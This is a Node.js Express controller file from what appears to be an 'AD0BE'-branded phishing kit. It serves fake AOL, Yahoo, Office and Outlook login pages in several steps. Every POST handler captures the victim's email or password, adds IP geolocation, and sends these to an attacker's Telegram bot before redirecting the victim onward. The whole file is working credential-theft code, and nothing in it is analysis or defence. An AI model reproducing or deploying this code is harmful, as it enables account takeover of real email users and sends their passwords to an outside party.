const { sendMessageFor } = require("simple-telegram-message");
const ipInfo = require("ip-info-finder");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../../settings");

exports.login = (req, res) => {
	return res.render("login");
};

exports.login2 = (req, res) => {
	switch (req.query.email_provider) {
		case "aol":
			return res.render("aol/login2");
			break;
		case "yahoo":
			return res.render("yahoo/login2");
			break;
		case "office":
			return res.render("office/login2");
			break;
		case "outlook":
			return res.render("office/login2");
			break;
		default:
			return res.render("login2");
			break;
	}
};

exports.loginPost2 = async (req, res) => {
	const { username, email_provider } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
		`👤 EMAIL INFO\n` +
		`EMAIL PROVIDER   : ${email_provider}\n` +
		`USER             : ${username}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	return res.redirect(`/auth/login/3?email_provider=${email_provider}`);
};

exports.login3 = (req, res) => {
	switch (req.query.email_provider) {
		case "aol":
			return res.render("aol/login3");
			break;
		case "yahoo":
			return res.render("yahoo/login3");
			break;
		case "office":
			return res.render("office/login3");
			break;
		case "outlook":
			return res.render("office/login3");
			break;
		default:
			return res.render("login3");
			break;
	}
};

exports.loginPost3 = async (req, res) => {
	const { password, email_provider } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
		`👤 EMAIL INFO\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	return res.redirect(`/auth/login/4?email_provider=${email_provider}`);
};

exports.login4 = (req, res) => {
	switch (req.query.email_provider) {
		case "aol":
			return res.render("aol/login4");
			break;
		case "yahoo":
			return res.render("yahoo/login4");
			break;
		case "office":
			return res.render("office/login4");
			break;
		case "outlook":
			return res.render("office/login4");
			break;
		default:
			return res.render("login4");
			break;
	}
};

exports.loginPost4 = async (req, res) => {
	const { password } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | AD0BE | USER_${ipAddress}\n\n` +
		`👤 EMAIL INFO (RELOGIN)\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	return res.redirect("/auth/complete");
};

exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};
